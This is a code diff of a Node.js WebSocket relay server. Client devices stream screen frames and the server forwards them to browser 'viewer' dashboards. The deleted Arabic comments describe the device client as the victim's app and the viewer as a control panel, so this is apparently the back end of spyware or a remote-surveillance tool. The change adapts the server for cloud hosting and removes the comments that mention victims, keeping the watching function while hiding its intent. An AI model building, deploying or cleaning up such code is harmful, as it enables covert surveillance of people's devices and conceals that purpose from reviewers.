@@ -33,18 +33,18 @@ const deviceConnections = new Map();
 const viewers = [];
 
 wss.on('connection', (ws, req) => {
-    const url = new URL(req.url, `http://${req.headers.host}`);
+    // تصحيح قراءة الرابط ليتوافق مع بروتوكولات wss:// و ws:// عبر بيئة الاستضافة
+    const host = req.headers.host;
+    const url = new URL(req.url, `http://${host}`);
     const deviceId = url.searchParams.get('device');
     const type = url.searchParams.get('type') || 'device'; // 'device' or 'viewer'
 
     console.log(`🔌 New connection: ${type} - ${deviceId || 'unknown'}`);
 
     if (type === 'device') {
-        // هذا اتصال من تطبيق الضحية
         deviceConnections.set(deviceId, ws);
         console.log(`📱 Device registered: ${deviceId}`);
 
-        // إعلام جميع المشاهدين بجهاز جديد
         broadcastToViewers({
             type: 'device_online',
             deviceId: deviceId,
@@ -52,10 +52,8 @@ wss.on('connection', (ws, req) => {
         });
 
         ws.on('message', (message) => {
-            // استقبال الإطار من جهاز الضحية
             const frameData = message.toString();
             
-            // إعادة الإرسال إلى جميع المشاهدين الذين يشاهدون هذا الجهاز
             broadcastToViewers({
                 type: 'frame',
                 deviceId: deviceId,
@@ -76,11 +74,9 @@ wss.on('connection', (ws, req) => {
         });
 
     } else if (type === 'viewer') {
-        // هذا اتصال من لوحة التحكم (المتصفح)
         const viewerId = url.searchParams.get('viewer') || Math.random().toString(36).substring(7);
         viewers.push({ id: viewerId, ws: ws });
 
-        // إرسال قائمة الأجهزة المتصلة
         const devices = Array.from(deviceConnections.keys()).map(id => ({
             id: id,
             online: true
@@ -101,16 +97,15 @@ function broadcastToViewers(data, filterDeviceId = null) {
     const message = JSON.stringify(data);
     viewers.forEach(viewer => {
         if (viewer.ws.readyState === WebSocket.OPEN) {
-            // إذا كان هناك فلتر، نرسل فقط للمشاهدين الذين يتابعون هذا الجهاز
-            // هنا نرسل للجميع، يمكن تحسينه لاحقاً
             viewer.ws.send(message);
         }
     });
 }
 
-// ─── تشغيل السيرفر ───
-const PORT = 8080;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
-    console.log(`📡 WebSocket on ws://0.0.0.0:${PORT}/stream`);
+// ─── تعديل تهيئة تشغيل السيرفر للتوافق السحابي ───
+// هنا نتحقق إذا كان هناك منفذ ممرر من Render، وإلا نستخدم 8080 محلياً
+const PORT = process.env.PORT || 8080;
+
+server.listen(PORT, () => {
+    console.log(`🚀 Server fully operational on port: ${PORT}`);
 });
